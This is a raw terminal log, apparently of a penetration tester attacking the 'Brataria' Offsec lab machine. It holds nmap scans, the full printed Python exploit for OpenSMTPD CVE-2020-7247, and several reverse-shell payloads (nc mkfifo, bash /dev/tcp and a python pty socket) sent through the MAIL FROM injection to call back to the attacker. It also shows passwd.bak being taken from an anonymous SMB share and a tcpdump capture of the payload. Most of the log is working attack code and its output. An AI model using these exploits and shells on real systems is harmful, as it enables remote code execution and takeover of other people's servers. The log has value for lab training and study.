@@ -1,0 +1,535 @@
+
+=== SESSION START: 2026-08-27 09:25:22 | Box: Brataria | IP: 192.168.183.71 | Platform: Offsec ===
+
+$ [09:25:26] htblog
+
+=== OUTPUT CAPTURE START: 2026-08-27 09:25:26 ===
+
+$ [09:30:00] sudo nmap -p- --min-rate 10000 -oA nmap/${BoxName}_allports $BoxIP
+
+=== SESSION RECONNECT: 2026-08-27 09:30:13 ===
+
+$ [09:30:20] htblog
+
+=== OUTPUT CAPTURE START: 2026-08-27 09:30:20 ===
+
+$ [09:30:25] nmap -sU --top-ports 100
+
+$ [09:30:29] sudo nmap -sU --top-ports 100
+
+$ [09:31:18] nmap -sU --top-ports 100 -oA nmap/${BoxName}_udp $BoxIP
+
+$ [09:31:23] sudo nmap -sU --top-ports 100 -oA nmap/${BoxName}_udp $BoxIP
+
+$ [09:33:49] nmap -sC -sV -p 22,25,80,445 -oA nmap/${BoxName}_services $BoxIP
+
+$ [09:33:53] sudo nmap -sC -sV -p 22,25,80,445 -oA nmap/${BoxName}_services $BoxIP
+Script started on 2026-08-27 09:30:20+01:00 [COMMAND="zsh -i" TERM="xterm-256color" TTY="/dev/pts/8" COLUMNS="117" LINES="55"]
+[1m[7m%[27m[1m[0m                                                                                                                     [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Brataria[39m [33m[09:30:20][39m $ [K[?1h=[?2004hnmap -sU --top-ports 100)[25D[32mn[32mm[32ma[32mp[39m[20C[1m[31m)[0m[39m[0m[39m [?1l>[?2004l
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-27 09:30 +0100
+WARNING: No targets were specified, so 0 hosts scanned.
+Nmap done: 0 IP addresses (0 hosts up) scanned in 0.01 seconds
+[1m[7m%[27m[1m[0m                                                                                                                     [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Brataria[39m [33m[09:30:25][39m $ [K[?1h=[?2004hs[4ms[24m[4ms[4mu[24m[24m[32ms[24m[32mu[39m[32ms[32mu[32md[39m[1m[31ms[1m[31mu[1m[31md[0m[39m[1m[31md[1m[31mo[0m[39m[0m[4m[32ms[0m[4m[32mu[0m[4m[32md[0m[4m[32mo[24m[39m[4m[32mo[4m[32m [24m[39m[4m[32mo[24m[39m[24m[39m ![1m[31m![0m[39m[1m[31m![1m[31m![0m[39m[0m[34m![0m[34m![39m[?1l>[?2004l
+sudo nmap -sU --top-ports 100
+[sudo] password for kali: 
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-27 09:30 +0100
+WARNING: No targets were specified, so 0 hosts scanned.
+Nmap done: 0 IP addresses (0 hosts up) scanned in 0.01 seconds
+[1m[7m%[27m[1m[0m                                                                                                                     [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Brataria[39m [33m[09:30:31][39m $ [K[?1h=[?2004hnmap -sU --top-ports 100 -oA nmap/${BoxName}_udp $BoxIP[55D[32mn[32mm[32ma[32mp[39m[51C[?1l>[?2004l
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-27 09:31 +0100
+Couldn't open a raw socket. Error: (1) Operation not permitted
+Couldn't open a raw socket or eth handle.
+QUITTING!
+[1m[7m%[27m[1m[0m                                                                                                                     [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Brataria[39m [33m[09:31:18][39m $ [K[?1h=[?2004hs[4ms[24m[4ms[24m[90mudo nmap -sU --top-ports 100[39m[28D[4ms[39m[4mu[24m[24m[32ms[24m[32mu[39m[32ms[32mu[32md[39m[1m[31ms[1m[31mu[1m[31md[0m[39m[1m[31md[1m[31mo[0m[39m[0m[4m[32ms[0m[4m[32mu[0m[4m[32md[0m[4m[32mo[24m[39m[4m[32mo[4m[32m [24m[39m[4m[32mo[24m[39m[24m[39m [39m![39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [23D[1m[31m![0m[39m[1m[31m![1m[31m![0m[39m[0m[34m![0m[34m![39m[?1l>[?2004l
+sudo nmap -sU --top-ports 100 -oA nmap/${BoxName}_udp $BoxIP
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-27 09:31 +0100
+Nmap scan report for 192.168.183.71
+Host is up (0.018s latency).
+All 100 scanned ports on 192.168.183.71 are in ignored states.
+Not shown: 100 open|filtered udp ports (no-response)
+
+Nmap done: 1 IP address (1 host up) scanned in 3.72 seconds
+[1m[7m%[27m[1m[0m                                                                                                                     [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Brataria[39m [33m[09:31:27][39m $ [K[?1h=[?2004h
+Script done on 2026-08-27 09:34:00+01:00 [COMMAND_EXIT_CODE="0"]
+Script started on 2026-08-27 09:25:26+01:00 [COMMAND="zsh -i" TERM="xterm-256color" TTY="/dev/pts/5" COLUMNS="80" LINES="24"]
+[1m[7m%[27m[1m[0m                                                                                [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Brataria[39m [33m[09:25:26][39m $ [K[?1h=[?2004h[0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Brataria[39m [33m[09:25:36][39m $ [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Brataria[39m [33m[09:25:36][39m $ s[4ms[24m[4ms[4mu[24m[24m[32ms[24m[32mu[39m[32ms[32mu[32md[39m[1m[31ms[1m[31mu[1m[31md[0m[39m[1m[31md[1m[31mo[0m[39m[0m[4m[32ms[0m[4m[32mu[0m[4m[32md[0m[4m[32mo[24m[39m[4m[32mo[4m[32m [24m[39m[4m[32mo[24m[39m[24m[39m nmap -p- --min-rate 10000 -oA nmap/${BoxName}_allports $BoxIP[61D[32mn[32mm[32ma[32mp[39m[57C[?1l>[?2004l
+[sudo] password for kali: 
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-27 09:30 +0100
+Nmap scan report for 192.168.183.71
+Host is up (0.012s latency).
+Not shown: 65530 filtered tcp ports (no-response)
+PORT    STATE  SERVICE
+22/tcp  open   ssh
+25/tcp  open   smtp
+53/tcp  closed domain
+80/tcp  open   http
+445/tcp open   microsoft-ds
+
+Nmap done: 1 IP address (1 host up) scanned in 13.89 seconds
+[1m[7m%[27m[1m[0m                                                                                                                      [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Brataria[39m [33m[09:30:16][39m $ [K[?1h=[?2004hnmap -sC -sV -p 22,25,80,445 -oA nmap/${BoxName}_services $BoxIP[64D[32mn[32mm[32ma[32mp[39m[60C[?1l>[?2004l
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-27 09:33 +0100
+Couldn't open a raw socket. Error: (1) Operation not permitted
+Couldn't open a raw socket or eth handle.
+QUITTING!
+[1m[7m%[27m[1m[0m                                                                                                                      [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Brataria[39m [33m[09:33:49][39m $ [K[?1h=[?2004hs[4ms[24m[4ms[24m[90mudo nmap -p- --min-rate 10000 -oA nmap/${BoxName}_allports $BoxIP[39m[65D[4ms[39m[4mu[24m[24m[32ms[24m[32mu[39m[32ms[32mu[32md[39m[1m[31ms[1m[31mu[1m[31md[0m[39m[1m[31md[1m[31mo[0m[39m[0m[4m[32ms[0m[4m[32mu[0m[4m[32md[0m[4m[32mo[24m[39m[4m[32mo[4m[32m [24m[39m[4m[32mo[24m[39m[24m[39m [39m![39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [60D[1m[31m![0m[39m[1m[31m![1m[31m![0m[39m[0m[34m![0m[34m![39m[?1l>[?2004l
+sudo nmap -sC -sV -p 22,25,80,445 -oA nmap/${BoxName}_services $BoxIP
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-27 09:33 +0100
+Nmap scan report for 192.168.183.71
+Host is up (0.014s latency).
+
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 db:dd:2c:ea:2f:85:c5:89:bc:fc:e9:a3:38:f0:d7:50 (RSA)
+|   256 e3:b7:65:c2:a7:8e:45:29:bb:62:ec:30:1a:eb:ed:6d (ECDSA)
+|_  256 d5:5b:79:5b:ce:48:d8:57:46:db:59:4f:cd:45:5d:ef (ED25519)
+25/tcp  open  smtp        OpenSMTPD
+| smtp-commands: bratarina Hello nmap.scanme.org [192.168.45.194], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP
+|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info
+80/tcp  open  http        nginx 1.14.0 (Ubuntu)
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+|_http-title:         Page not found - FlaskBB        
+445/tcp open  netbios-ssn Sa
+$ [09:37:59] searchsploit -p 47984
+
+$ [09:39:27] nc -nv $BoxIP 25
+
+$ [09:41:33] searchsploit opensmtpd
+mba smbd 4.7.6-Ubuntu (workgroup: COFFEECORP)
+Service Info: Host: bratarina; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
+|   Computer name: bratarina
+|   NetBIOS computer name: BRATARINA\x00
+|   Domain name: \x00
+|   FQDN: bratarina
+|_  System time: 2026-08-27T04:34:02-04:00
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2026-08-27T08:34:01
+|_  start_date: N/A
+|_clock-skew: mean: 1h19m59s, deviation: 2h18m36s, median: -2s
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 47.17 seconds
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Brataria[39m [33m[09:34:40][39m $ [K[?1h=[?2004hsearchsploit -p 47984[21D[32ms[32me[32ma[32mr[32mc[32mh[32ms[32mp[32ml[32mo[32mi[32mt[39m[9C[?1l>[?2004l
+  Exploit: OpenSMTPD 6.6.1 - Remote Code Execution
+      URL: https://www.exploit-db.com/exploits/47984
+     Path: /usr/share/exploitdb/exploits/linux/remote/47984.py
+    Codes: CVE-2020-7247
+ Verified: True
+File Type: Python script, ASCII text executable
+Copied EDB-ID #47984's path to the clipboard
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Brataria[39m [33m[09:37:59][39m $ [K[?1h=[?2004hnc -nv $BoxIP 25[16D[32mn[32mc[39m[14C[?1l>[?2004l
+Connection to 192.168.183.71 25 port [tcp/*] succeeded!
+220 bratarina ESMTP OpenSMTPD
+quit
+221 2.0.0 Bye
+^C
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Brataria[39m [33m[09:40:35][39m $ [K[?1h=[?2004hsearchsploit opensmtpd[22D[32ms[32me[32ma[32mr[32mc[32mh[32ms[32mp[32ml[32mo[32mi[32mt[39m[10C[?1l>[?2004l
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                                                                                                                                              |  Path
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+[01;31m[KOpenSMTPD[m[K - MAIL FROM Remote Code Execution (Metasploit)                                                                                                                                                    | linux/remote/48038.rb
+[01;31m[KOpenSMTPD[m[K - OOB Read Local Privilege Escalation (Metasploit)                                                                                                                                                | linux/local/48185.rb
+[01;31m[KOpenSMTPD[m[K 6.4.0 < 6.6.1 - Local Privilege Escalation + Remote Code Execution                              
+$ [09:42:30] searchsploit -p 47984
+
+$ [09:43:30] cp /usr/share/exploitdb/exploits/linux/remote/47984.py exploits/
+
+$ [09:43:39] ls exploits/
+
+$ [09:44:03] cat exploits/47984.py
+                                                                                                  | openbsd/remote/48051.pl
+[01;31m[KOpenSMTPD[m[K 6.6.1 - Remote Code Execution                                                                                                                                                                     | linux/remote/47984.py
+[01;31m[KOpenSMTPD[m[K 6.6.3 - Arbitrary File Read                                                                                                                                                                       | linux/remote/48139.c
+[01;31m[KOpenSMTPD[m[K < 6.6.3p1 - Local Privilege Escalation + Remote Code Execution                                                                                                                                    | openbsd/remote/48140.c
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Brataria[39m [33m[09:41:33][39m $ [K[?1h=[?2004hsearchsploit -p 47984[21D[32ms[32me[32ma[32mr[32mc[32mh[32ms[32mp[32ml[32mo[32mi[32mt[39m[9C[?1l>[?2004l
+  Exploit: OpenSMTPD 6.6.1 - Remote Code Execution
+      URL: https://www.exploit-db.com/exploits/47984
+     Path: /usr/share/exploitdb/exploits/linux/remote/47984.py
+    Codes: CVE-2020-7247
+ Verified: True
+File Type: Python script, ASCII text executable
+Copied EDB-ID #47984's path to the clipboard
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Brataria[39m [33m[09:42:30][39m $ [K[?1h=[?2004hcp /usr/share/exploitdb/exploits/linux/remote/47984.py exploits/[64D[32mc[32mp[39m [4m/[4mu[4ms[4mr[4m/[4ms[4mh[4ma[4mr[4me[4m/[4me[4mx[4mp[4ml[4mo[4mi[4mt[4md[4mb[4m/[4me[4mx[4mp[4ml[4mo[4mi[4mt[4ms[4m/[4ml[4mi[4mn[4mu[4mx[4m/[4mr[4me[4mm[4mo[4mt[4me[4m/[4m4[4m7[4m9[4m8[4m4[4m.[4mp[4my[24m [4me[4mx[4mp[4ml[4mo[4mi[4mt[4ms[4m/[24m[?1l>[?2004l
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Brataria[39m [33m[09:43:30][39m $ [K[?1h=[?2004hls exploits/[12D[32ml[32ms[39m [4me[4mx[4mp[4ml[4mo[4mi[4mt[4ms[4m/[24m[?1l>[?2004l
+47984.py
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Brataria[39m [33m[09:43:39][39m $ [K[?1h=[?2004hcat exploits/47984.py[21D[32mc[32ma[32mt[39m [4me[4mx[4mp[4ml[4mo[4mi[4mt[4ms[4m/[4m4[4m7[4m9[4m8[4m4[4m.[4mp[4my[24m[?1l>[?2004l
+# Exploit Title: OpenSMTPD 6.6.1 - Remote Code Execution
+# Date: 2020-01-29
+# Exploit Author: 1F98D
+# Original Author: Qualys Security Advisory
+# Vendor Homepage: https://www.opensmtpd.org/
+# Software Link: https://github.com/OpenSMTPD/OpenSMTPD/releases/tag/6.6.1p1
+# Version: OpenSMTPD < 6.6.2
+# Tested on: Debian 9.11 (x64)
+=== SESSION RECONNECT: 2026-08-27 09:45:14 ===
+
+$ [09:45:19] htblog
+
+=== OUTPUT CAPTURE START: 2026-08-27 09:45:19 ===
+
+$ [09:45:22] listener
+
+$ [09:46:12] python3 exploits/47984.py $BoxIP 25 "mkfifo /tmp/s; nc $LocalIP $Port 0</tmp/s | /bin/sh >/tmp/s 2>&1; rm /tmp/s"
+
+$ [09:48:27] PAYLOAD=$(echo "bash -i >& /dev/tcp/$LocalIP/$Port 0>&1" | base64 -w0)
+
+# CVE: CVE-2020-7247
+# References:
+# https://www.openwall.com/lists/oss-security/2020/01/28/3
+#
+# OpenSMTPD after commit a8e222352f and before version 6.6.2 does not adequately
+# escape dangerous characters from user-controlled input. An attacker
+# can exploit this to execute arbitrary shell commands on the target.
+#
+#!/usr/local/bin/python3
+
+from socket import *
+import sys
+
+if len(sys.argv) != 4:
+    print('Usage {} <target ip> <target port> <command>'.format(sys.argv[0]))
+    print("E.g. {} 127.0.0.1 25 'touch /tmp/x'".format(sys.argv[0]))
+    sys.exit(1)
+
+ADDR = sys.argv[1]
+PORT = int(sys.argv[2])
+CMD = sys.argv[3]
+
+s = socket(AF_INET, SOCK_STREAM)
+s.connect((ADDR, PORT))
+
+res = s.recv(1024)
+if 'OpenSMTPD' not in str(res):
+    print('[!] No OpenSMTPD detected')
+    print('[!] Received {}'.format(str(res)))
+    print('[!] Exiting...')
+    sys.exit(1)
+
+print('[*] OpenSMTPD detected')
+s.send(b'HELO x\r\n')
+res = s.recv(1024)
+if '250' not in str(res):
+    print('[!] Error connecting, expected 250')
+    print('[!] Received: {}'.format(str(res)))
+    print('[!] Exiting...')
+    sys.exit(1)
+
+print('[*] Connected, sending payload')
+s.send(bytes('MAIL FROM:<;{};>\r\n'.format(CMD), 'utf-8'))
+res = s.recv(1024)
+if '250' not in str(res):
+    print('[!] Error sending payload, expected 250')
+    print('[!] Received: {}'.format(str(res)))
+    print('[!] Exiting...')
+    sys.exit(1)
+
+print('[*] Payload sent')
+s.send(b'RCPT TO:<root>\r\n')
+s.recv(1024)
+s.send(b'DATA\r\n')
+s.recv(1024)
+s.send(b'\r\nxxx\r\n.\r\n')
+s.recv(1024)
+s.send(b'QUIT\r\n')
+s.recv(1024)
+print('[*] Done')[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Brataria[39m [33m[09:44:03][39m $ [K[?1h=[?2004h[0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Brataria[39m [33m[09:45:14][39m $ python3 exploits/47984.py $BoxIP 25 "mkfifo /tmp/s; nc $LocalIP $Port 0</tmp/s | /bin/sh >/tmp/s 2>&1; rm /tmp/s"[K[A[5C[32mp[32my[32mt[32mh[32mo[32mn[32m3[39m [4me[4mx[4mp[4ml[4mo[4mi[4mt[4ms[4m/[4m4[4m7[4m9[4m8[4m4[4m.[4mp[4my[24m[11C[33m"[33mm[33mk[33mf[33mi[33mf[33mo[33m [33m/[33mt[33mm[33mp[33m/[33ms[33m;[33m [33mn[33mc[33m [36m$[36mL[36mo[36mc[36ma[36ml[36mI[36mP[39m[33m [36m$[36mP[36mo[36mr[36mt[39m[33m [33m0[33m<[33m/[33mt[33mm[33mp[33m/[33ms[33m [33m|[33m [33m/[33mb[33mi[33mn[33m/[33ms[33mh[33m [33m>[33m/[33mt[33mm[33mp[33m/[33ms[33m [33m2[33m>[33m&[33m1[33m;[33m [33mr[33mm[33m [33m/[33mt[33mm[33mp[33m/[33ms[33m"[39m[?1l>[?2004l
+[*] OpenSMTPD detected
+[*] Connected, sending payload
+[!] Error sending payload, expected 250
+[!] Received: b'503 5.5.4 Invalid command arguments: Unsupported option /tmp/s\r\n'
+[!] Exiting...
+[1m[7m%[27m[1m[0m                                                                                                                      [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Brataria[39m [33m[09:46:12][39m $ [K[?1h=[?2004hPAYLOAD=$(echo "bash -i >& /dev/tcp/$LocalIP/$Port 0>&1" | base64 -w0)[K[A[56C[35m$[35m([39m[32me[32mc[32mh[32mo[39m [33m"[33mb[33ma[33ms[33mh[33m [33m-[33mi[33m [33m>[33m&[33m [33m/[33md[33me[33mv[33m/[33mt[33mc[33mp[33m/[36m$[36mL[36mo[36mc[36ma[36ml[36mI[36mP[39m[33m/[36m$[36mP[36mo[36mr[36mt[39m[33m [33m0[33m>[33m&[33m1[33m"[39m[3C[32mb[32ma[32ms[32me[32m6[32m4[39m[1B[114D[35m)[39m[?1l>[?2004l
+[1m[7m%[27m[1m[0m                                                                                                                      [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Brataria[39m [33m[09:48:27][39m $ [K[?1h=[?2004hpython3 exploits/47
+$ [09:48:28] python3 exploits/47984.py $BoxIP 25 "echo $PAYLOAD|base64 -d|bash"
+
+$ [09:52:16] smbclient -L //$BoxIP -N
+
+$ [09:53:53] smbclient //$BoxIP/backups -N
+
+$ [09:55:41] loot file passwd.bak
+
+$ [09:55:46] cat passwd.bak
+984.py $BoxIP 25 "echo $PAYLOAD|base64 -d|bash"[66D[32mp[32my[32mt[32mh[32mo[32mn[32m3[39m [4me[4mx[4mp[4ml[4mo[4mi[4mt[4ms[4m/[4m4[4m7[4m9[4m8[4m4[4m.[4mp[4my[24m[11C[33m"[33me[33mc[33mh[33mo[33m [36m$[36mP[36mA[36mY[36mL[36mO[36mA[36mD[39m[33m|[33mb[33ma[33ms[33me[33m6[33m4[33m [33m-[33md[33m|[33mb[33ma[33ms[33mh[33m"[39m[?1l>[?2004l
+[*] OpenSMTPD detected
+[*] Connected, sending payload
+[*] Payload sent
+[*] Done
+[1m[7m%[27m[1m[0m                                                                                                                      [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Brataria[39m [33m[09:48:28][39m $ [K[?1h=[?2004hs[4ms[24m[4ms[24m[90mearchsploit -p 47984[39m[20D[4ms[39m[4mm[24m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [19D[24m[1m[31ms[24m[1m[31mm[0m[39m[1m[31ms[1m[31mm[1m[31mb[0m[39m[1m[31mb[1m[31mc[0m[39m[1m[31mc[1m[31ml[0m[39m[1m[31ml[1m[31mi[0m[39m[1m[31mi[1m[31me[0m[39m[1m[31me[1m[31mn[0m[39m[1m[31mn[1m[31mt[0m[39m[9D[0m[32ms[0m[32mm[0m[32mb[0m[32mc[0m[32ml[0m[32mi[0m[32me[0m[32mn[0m[32mt[39m[32mt[32m [39m[32mt[39m[39m -L /[4m/[24m[4m/[4m/[24m[4m/[4m$[24m[24m/[24m/[24m$BoxIP -N[?1l>[?2004l
+Anonymous login successful
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	backups         Disk      Share for backups
+	IPC$            IPC       IPC Service (Samba 4.7.6-Ubuntu)
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 192.168.183.71 failed (Error NT_STATUS_IO_TIMEOUT)
+Unable to connect with SMB1 -- no workgroup available
+[1m[7m%[27m[1m[0m                                                                                                                      [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Brataria[39m [33m[09:52:21][39m $ [K[?1h=[?2004hsmbclient //$BoxIP/backups -N[29D[32ms[32mm[32mb[32mc[32ml[32mi[32me[32mn[32mt[39m[20C[?1l>[?2004l
+Anonymous login successful
+Try "help" to get a list of possible commands.
+[?2004hsmb: \> ls
+[?2004l  .                                   D        0  Mon Jul  6 08:46:41 2020
+  ..                                  D        0  Mon Jul  6 08:46:41 2020
+  passwd.bak                          N     1747  Mon Jul  6 08:46:41 2020
+
+		10253588 blocks of size 1024. 6355296 blocks available
+[?2004hsmb: \> get passwd.bak
+[?2004lgetting file \passwd.bak of size 1747 as passwd.bak (37.1 KiloBytes/sec) (average 37.1 KiloBytes/sec)
+[?2004hsmb: \> ^C[?2004l
+[1m[7m%[27m[1m[0m                                                                                                                      [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Brataria[39m [33m[09:55:38][39m $ [K[?1h=[?2004hloot file passwd.bak[20D[32ml[32mo[32mo[32mt[39m[6C[4mp[4ma[4ms[4ms[4mw[4md[4m.[4mb[4ma[4mk[24m[?1l>[?2004l
+[+] File saved:  passwd.bak  →  loot/
+[1m[7m%[27m[1m[0m                                                                                                                      [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Brataria[39m [33m[09:55:41][39m $ [K[?1h=[?2004hc[1m[31mc[0m[39m[1m[31mc[0m[39m[90mat exploits/47984.py[39m[20D[1m[31mc[1m[31ma[0m[39m[1m[31mc[1m[31ma[1m[31mt[0m[39m[0m[32mc[0m[32ma[0m[32mt[39m[32mt[32m [39m[32mt[39m[39m [39mp[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [16D[4mp[24m[4mp[4ma[24m[4ma[4ms[24m[4ms[4ms[24m[4ms[4mw[24m[4mw[4md[24m[4md[4m.[24m[4m.[4mb[24m[4mb[4ma[24m[4ma[4mk[24m[?1l>[?2004l
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev
+=== SESSION RECONNECT: 2026-08-27 10:00:15 ===
+
+$ [10:00:20] htblog
+
+=== OUTPUT CAPTURE START: 2026-08-27 10:00:20 ===
+
+$ [10:00:22] sudo tcpdump -ni any host $BoxIP and tcp
+
+$ [10:00:48] python3 exploits/47984.py $BoxIP 25 "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"$LocalIP\",4444));[os.dup2(s.fileno(),x) for x in (0,1,2)];pty.spawn(\"/bin/bash\")'"
+Script started on 2026-08-27 10:00:20+01:00 [COMMAND="zsh -i" TERM="xterm-256color" TTY="/dev/pts/8" COLUMNS="57" LINES="55"]
+[1m[7m%[27m[1m[0m                                                         [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Brataria[39m [33m[10:00:20][39m $ [K[?1h=[?2004hsudo tcpdump -ni any host $BoxIP and tcp[K[A[17C[4m[32ms[4m[32mu[4m[32md[4m[32mo[24m[39m [32mt[32mc[32mp[32md[32mu[32mm[32mp[39m[28C[?1l>[?2004l
+[sudo] password for kali: 
+tcpdump: WARNING: any: That device doesn't support promiscuous mode
+(Promiscuous mode not supported on the "any" device)
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes
+10:00:48.415268 tun0  Out IP 192.168.45.194.41370 > 192.168.183.71.25: Flags [S], seq 3342913955, win 64240, options [mss 1460,sackOK,TS val 2681773981 ecr 0,nop,wscale 10], length 0
+10:00:48.433998 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.41370: Flags [S.], seq 1366516538, ack 3342913956, win 65160, options [mss 1400,sackOK,TS val 2067751077 ecr 2681773981,nop,wscale 7], length 0
+10:00:48.434033 tun0  Out IP 192.168.45.194.41370 > 192.168.183.71.25: Flags [.], ack 1, win 63, options [nop,nop,TS val 2681774000 ecr 2067751077], length 0
+10:00:48.448518 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.41370: Flags [P.], seq 1:32, ack 1, win 510, options [nop,nop,TS val 2067751091 ecr 2681774000], length 31: SMTP: 220 bratarina ESMTP OpenSMTPD
+10:00:48.448539 tun0  Out IP 192.168.45.194.41370 > 192.168.183.71.25: Flags [.], ack 32, win 63, options [nop,nop,TS val 2681774014 ecr 2067751091], length 0
+10:00:48.448716 tun0  Out IP 192.168.45.194.41370 > 192.168.183.71.25: Flags [P.], seq 1:9, ack 32, win 63, options [nop,nop,TS val 2681774014 ecr 2067751091], length 8: SMTP: HELO x
+10:00:48.457649 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.41370: Flags [.], ack 9, win 510, options [nop,nop,TS val 2067751101 ecr 2681774014], length 0
+10:00:48.457669 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.41370: Flags [P.], seq 32:93, ack 9, win 510, options [nop,nop,TS val 2067751101 ecr 2681774014], length 61: SMTP: 250 bratarina Hello x [192.168.45.194], pleased to meet you
+10:00:48.457767 tun0  Out IP 192.168.45.194.41370 > 192.168.183.71.25: Flags [P.], seq 9:175, ack 93, win 63, options [nop,nop,TS val 2681774023 ecr 2067751101], length 166: SMTP: MAIL FROM:<;python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.45.194",4444));[os.dup2(s.fileno(),x) for x in (0,1,2)];pty.spawn("/bin/bash")';>
+10:00:48.467744 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.41370: Flags [P.], seq 93:107, ack 175, win 509, options [nop,nop,TS val 2067751111 ecr 2681774023], length 14: SMTP: 250 2.0.0 Ok
+10:00:48.468276 tun0  Out IP 192.168.45.194.41370 > 192.168.183.71.25: Flags [P.], seq 175:191, ack 107, win 63, options [nop,nop,TS val 2681774034 ecr 2067751111], length 16: SMTP: RCPT TO:<root>
+10:00:48.478361 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.41370: Flags [P.], seq 107:158, ack 191, win 509, options [nop,nop,TS val 2067751122 ecr 2681774034], length 51: SMTP: 250 2.1.5 Destination address valid: Recipient ok
+10:00:48.478877 tun0  Out IP 192.168.45.194.41370 > 192.168.183.71.25: Flags [P.], seq 191:197, ack 158, win 63, options [nop,nop,TS val 2681774045 ecr 2067751122], length 6: SMTP: DATA
+10:00:48.488774 tun0  In  IP 192.168.183.71.25 > 192.168.45.194.41370: Flags [P.], seq 158:208, ack 197, win 509, options [nop,nop,TS val 2067751132 ecr 2681774045], length 50: SMTP: 354 Enter mail, end with "." on a line by itself
+10:00:48.489841 tun0  Out IP 192.168.45.194.41370 > 192.168.183.71.25: Flags [P.], seq 197:207, ack 208, win 63, options [nop,nop,TS val 2681774055 ecr 2067751132], length 10: SMTP: 
